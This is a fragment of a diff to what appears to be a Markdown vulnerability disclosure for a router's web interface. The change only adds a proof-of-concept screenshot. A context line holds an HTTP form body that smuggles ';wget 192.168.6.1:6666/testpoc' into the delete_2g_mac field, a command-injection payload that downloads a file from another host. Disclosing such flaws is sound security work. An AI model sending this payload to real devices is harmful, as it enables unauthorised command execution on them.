@@ -51,4 +51,5 @@ Content-Length: 78
 page=Delete_Mac_list&delete_list=&delete_2g_mac=;wget 192.168.6.1:6666/testpoc
 ```
 
+<div  align="center"><img src="./img/poc.png" style="zoom:80%;" /></div>
 
